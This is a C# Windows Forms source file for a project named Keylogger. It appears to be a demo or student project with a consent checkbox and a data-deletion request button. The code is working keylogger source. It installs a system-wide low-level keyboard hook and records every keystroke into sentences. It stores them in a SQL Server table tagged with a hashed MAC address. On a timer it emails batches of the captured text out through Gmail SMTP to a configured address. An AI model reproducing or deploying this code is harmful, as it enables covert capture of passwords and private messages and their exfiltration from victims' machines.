using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;




namespace Keylogger
{
    public partial class Form1 : Form
    {
        
        private readonly string DbConnectionString = "Data Source=.;Initial Catalog=DboKeylogger;Integrated Security=True";


        private readonly string smtpUser = ConfigurationManager.AppSettings["SmtpUser"];
        private readonly string smtpAppPassword = ConfigurationManager.AppSettings["SmtpAppPassword"];
        private readonly string smtpTo = ConfigurationManager.AppSettings["SmtpTo"];
        private readonly int sendBatchSize = int.Parse(ConfigurationManager.AppSettings["SendBatchSize"]);
        private readonly int maxSendAttempts = int.Parse(ConfigurationManager.AppSettings["MaxSendAttempts"]);
        private readonly int sendIntervalMinutes = int.Parse(ConfigurationManager.AppSettings["SendIntervalMinutes"]);



        

        static readonly int WH_KEYBOARD_LL = 13;
        static IntPtr hHook = IntPtr.Zero;
        static HookProc _hookProc = KbdHook; 
        delegate int HookProc(int code, IntPtr wParam, IntPtr lParam);

        private static StringBuilder buffer = new StringBuilder(4096);
        private static readonly object bufferLock = new object();

   
        private System.Windows.Forms.Timer sendTimer;

   
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", SetLastError = true)]
        static extern short GetKeyState(int key);

        [DllImport("user32.dll")]
        static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
            StringBuilder receivingBuffer, int bufferSize, uint flags);

        [StructLayout(LayoutKind.Sequential)]
        public class KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [Flags]
        public enum KBDLLHOOKSTRUCTFlags : uint
        {
            LLKHF_EXTENDED = 0x01,
            LLKHF_INJECTED = 0x10,
            LLKHF_ALTDOWN = 0x20,
            LLKHF_UP = 0x80,
        }

        static readonly int ShiftKey = 16;
        static readonly int CapitalKey = 20;
        static readonly int MenuKey = 18;
        static readonly int VK_CAPITAL = 0x14;
        static readonly int MASK_UP = (1 << 15);

        static bool shift_active() => (GetKeyState(ShiftKey) & MASK_UP) != 0;
        static bool capital_active() => (GetKeyState(VK_CAPITAL) & 1) == 1;
        static bool menu_active() => (GetKeyState(MenuKey) & 1) == 1;

        public Form1()
        {
            InitializeComponent();


            sendTimer = new System.Windows.Forms.Timer();
            sendTimer.Interval = sendIntervalMinutes * 60 * 1000; // dakika → ms
            sendTimer.Tick += async (s, e) =>
            {
                await Task.Run(() => SendPendingLogsBatch(sendBatchSize));
            };
            sendTimer.Start();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            IntPtr hMod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, hMod, 0);

            
            Task.Run(() => SendPendingLogsBatch(sendBatchSize));

            
            sendTimer.Start();


           
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
           
            try { sendTimer?.Stop(); } catch { }

            
            try
            {
                lock (bufferLock)
                {
                    if (buffer.Length > 0)
                    {
                        string leftover = buffer.ToString().Trim();
                        if (!string.IsNullOrEmpty(leftover))
                        {
                            CumleyiKaydet(leftover);
                            buffer.Clear();
                        }
                    }
                }
            }
            catch { /* ignore */ }

            
            try
            {
                if (hHook != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hHook);
                    hHook = IntPtr.Zero;
                }
            }
            catch { /* ignore */ }

            base.OnFormClosing(e);
        }

        
        public static int KbdHook(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code < 0)
                return CallNextHookEx(hHook, code, wParam, lParam);

            int c = (int)wParam;
            bool onKey = (c == 0x100 || c == 0x104);

            if (onKey)
            {
                KBDLLHOOKSTRUCT kbd = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));

                byte[] keyboardState = new byte[256];
                bool shift_on = shift_active();
                bool caps_on = capital_active();

                GetKeyboardState(keyboardState);
                keyboardState[ShiftKey] = (byte)(shift_on ? 0xff : 0);
                keyboardState[CapitalKey] = (byte)(caps_on ? 1 : 0);

                StringBuilder buf = new StringBuilder(256);
                int res = ToUnicode(kbd.vkCode, kbd.scanCode, keyboardState, buf, 256, 0);

                if (res > 0)
                {
                    string pressedKey = buf.ToString();

                    if (Application.OpenForms["Form1"] is Form1 form)
                    {
                        form.BeginInvoke((MethodInvoker)(() => form.rtxtLog.AppendText(pressedKey)));
                    }

                    lock (bufferLock)
                    {
                        buffer.Append(pressedKey);

                        
                        if (Regex.IsMatch(pressedKey, @"[.!?\r\n]"))
                        {
                            string sentence = buffer.ToString().Trim();
                            buffer.Clear();

                            if (!string.IsNullOrWhiteSpace(sentence) && Application.OpenForms["Form1"] is Form1 frm)
                            {
                                
                                frm.BeginInvoke((MethodInvoker)(() => frm.CumleyiKaydet(sentence)));
                            }
                        }
                    }
                }
                else if (res == -1)
                {
                   
                    ToUnicode(kbd.vkCode, kbd.scanCode, keyboardState, new StringBuilder(256), 256, 0);
                }
            }

            return CallNextHookEx(hHook, code, wParam, lParam);
        }
        public void CumleyiKaydet(string cumle)
        {
            try
            {
                // Cihazın birincil MAC'ini al, hashle
                string primaryMac = GetPrimaryMacAddress();
                string macHash = null;
                if (!string.IsNullOrEmpty(primaryMac))
                    macHash = Sha256Hex(primaryMac);

                using (SqlConnection con = new SqlConnection(DbConnectionString))
                using (SqlCommand cmd = new SqlCommand(
                    "INSERT INTO TBL_LOGGER (logl, tarih, gonderildi, sendAttempts, mac_hash) VALUES (@logl, @tarih, 0, 0, @mac_hash)", con))
                {
                    cmd.Parameters.AddWithValue("@logl", cumle);
                    cmd.Parameters.AddWithValue("@tarih", DateTime.Now);
                    cmd.Parameters.AddWithValue("@mac_hash", (object)macHash ?? DBNull.Value);
                    con.Open();
                    cmd.ExecuteNonQuery();
                }

                if (rtxtLog.InvokeRequired)
                    rtxtLog.Invoke((MethodInvoker)(() => rtxtLog.AppendText(Environment.NewLine + "[KAYIT ALINDI] " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine)));
                else
                    rtxtLog.AppendText(Environment.NewLine + "[KAYIT ALINDI] " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("CumleyiKaydet hata: " + ex.Message);
            }
        }


        private List<(int id, string text, DateTime time, int attempts, string macHash)> GetPendingLogsBatch(int top)
        {
            var list = new List<(int, string, DateTime, int, string)>();
            string query = @"SELECT TOP(@top) logId, logl, tarih, sendAttempts, mac_hash
                     FROM TBL_LOGGER 
                     WHERE gonderildi = 0 AND sendAttempts < @maxAttempts
                     ORDER BY logId ASC";

            using (SqlConnection conn = new SqlConnection(DbConnectionString))
            using (SqlCommand cmd = new SqlCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@top", top);
                cmd.Parameters.AddWithValue("@maxAttempts", maxSendAttempts);
                conn.Open();
                using (var rdr = cmd.ExecuteReader())
                {
                    while (rdr.Read())
                    {
                        int id = (int)rdr["logId"];
                        string text = rdr["logl"] as string ?? "";
                        DateTime time = rdr["tarih"] == DBNull.Value ? DateTime.MinValue : (DateTime)rdr["tarih"];
                        int attempts = rdr["sendAttempts"] == DBNull.Value ? 0 : (int)rdr["sendAttempts"];
                        string macHash = rdr["mac_hash"] == DBNull.Value ? null : (string)rdr["mac_hash"];
                        list.Add((id, text, time, attempts, macHash));
                    }
                }
            }

            return list;
        }


        private void MarkAsSent(IEnumerable<int> ids)
        {
            if (!ids.Any()) return;
            string query = "UPDATE TBL_LOGGER SET gonderildi = 1 WHERE logId IN (" + string.Join(",", ids) + ")";

            using (SqlConnection conn = new SqlConnection(DbConnectionString))
            using (SqlCommand cmd = new SqlCommand(query, conn))
            {
                conn.Open();
                cmd.ExecuteNonQuery();
            }
        }

        private void IncrementAttempts(IEnumerable<int> ids)
        {
            if (!ids.Any()) return;
            string query = "UPDATE TBL_LOGGER SET sendAttempts = sendAttempts + 1 WHERE logId IN (" + string.Join(",", ids) + ")";

            using (SqlConnection conn = new SqlConnection(DbConnectionString))
            using (SqlCommand cmd = new SqlCommand(query, conn))
            {
                conn.Open();
                cmd.ExecuteNonQuery();
            }
        }

        public void SendPendingLogsBatch(int batchSize = 15)
        {
            try
            {
                var pending = GetPendingLogsBatch(batchSize);
                if (pending == null || pending.Count == 0)
                {
                    Debug.WriteLine("Gönderilecek bekleyen kayıt yok veya hepsi deneme sınırını aştı.");
                    return;
                }

                // E-posta içeriği
                var sb = new StringBuilder();
                sb.AppendLine("Aşağıdaki kayıtlar gönderiliyor:");
                sb.AppendLine();
                foreach (var p in pending)
                {
                    // p: (id, text, time, attempts, macHash)
                    sb.AppendLine($"{p.time:yyyy-MM-dd HH:mm:ss} - {p.text}");
                    if (!string.IsNullOrEmpty(p.macHash))
                    {
                        sb.AppendLine($"Cihaz MAC (SHA256): {p.macHash}");
                    }
                    else
                    {
                        sb.AppendLine("Cihaz MAC: (yok)");
                    }
                    sb.AppendLine(new string('-', 40));
                }

                bool sent = false;
                try
                {
                    SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, smtpTo, $"Log Gönderimi - {DateTime.Now:yyyy-MM-dd HH:mm}", sb.ToString());
                    sent = true;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("E-posta gönderim hatası: " + ex.Message);
                    sent = false;
                }

                var ids = pending.Select(x => x.id).ToList();

                if (sent)
                {
                    MarkAsSent(ids);
                    Debug.WriteLine($"Başarıyla gönderildi: {ids.Count} kayıt.");
                }
                else
                {
                    IncrementAttempts(ids);
                    Debug.WriteLine($"Gönderilemedi. Deneme sayısı artırıldı: {ids.Count} kayıt.");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("SendPendingLogsBatch hata: " + ex.Message);
            }
        }


        private void SendEmail_WithGmailSmtp(string smtpUserLocal, string smtpAppPasswordLocal, string toEmail, string subject, string body)
        {
            var fromAddress = new MailAddress(smtpUserLocal, "Logger App");
            var toAddress = new MailAddress(toEmail);

            using (var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(smtpUserLocal, smtpAppPasswordLocal),
                Timeout = 30000
            })
            using (var msg = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body,
                IsBodyHtml = false
            })
            {
                smtp.Send(msg);
            }
        }
        private void llbnProjeLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("chrome", "https://github.com");
        }

        private void llbnProfilLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("chrome", "https://github.com/BilalAbic");
        }

        private string Sha256Hex(string input)
        {
            if (string.IsNullOrEmpty(input)) return null;
            using (var sha = SHA256.Create())
            {
                var bytes = Encoding.UTF8.GetBytes(input);
                var hash = sha.ComputeHash(bytes);
                var sb = new StringBuilder(64);
                foreach (var b in hash) sb.Append(b.ToString("x2"));
                return sb.ToString();
            }
        }


        private void btnOnay_Click(object sender, EventArgs e)
        {
            try
            {
                if (!rbtOnay.Checked)
                {
                    MessageBox.Show("Lütfen onay kutusunu işaretleyin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                string userEmail = txtEmail.Text.Trim();
                if (string.IsNullOrEmpty(userEmail))
                {
                    MessageBox.Show("Lütfen e-posta adresinizi girin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                // Bu cihazın MAC'ini al ve hashle
                string primaryMac = GetPrimaryMacAddress();
                string macHash = !string.IsNullOrEmpty(primaryMac) ? Sha256Hex(primaryMac) : null;

                string subject = "Veri Silme Talebi";
                var bodySb = new StringBuilder();
                bodySb.AppendLine("Merhaba,");
                bodySb.AppendLine();
                bodySb.AppendLine($"{userEmail} e-posta adresine ait kullanıcı verilerinin silinmesini talep ediyorum.");
                bodySb.AppendLine();
                if (!string.IsNullOrEmpty(macHash))
                    bodySb.AppendLine($"Talep eden cihazın MAC (SHA256): {macHash}");
                else
                    bodySb.AppendLine("Talep eden cihazın MAC bilgisi elde edilemedi.");
                bodySb.AppendLine();
                bodySb.AppendLine("Teşekkürler.");

                SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, "bilalabic78@gmail.com", subject, bodySb.ToString());

                MessageBox.Show("Talebiniz gönderildi.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Mail gönderim hatası: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Debug.WriteLine("Veri silme talebi gönderim hatası: " + ex.Message);
            }
        }


        private string FormatMacAddress(PhysicalAddress pa)
        {
            var bytes = pa.GetAddressBytes();
            return string.Join(":", bytes.Select(b => b.ToString("X2")));
        }
        private string GetPrimaryMacAddress()
        {
            var nic = NetworkInterface.GetAllNetworkInterfaces()
                .Where(ni =>
                    ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                    ni.OperationalStatus == OperationalStatus.Up &&
                    ni.GetPhysicalAddress()?.GetAddressBytes().Length > 0)
                .OrderByDescending(ni => ni.Speed)
                .FirstOrDefault();

            return nic != null ? FormatMacAddress(nic.GetPhysicalAddress()) : null;
        }

    }
}
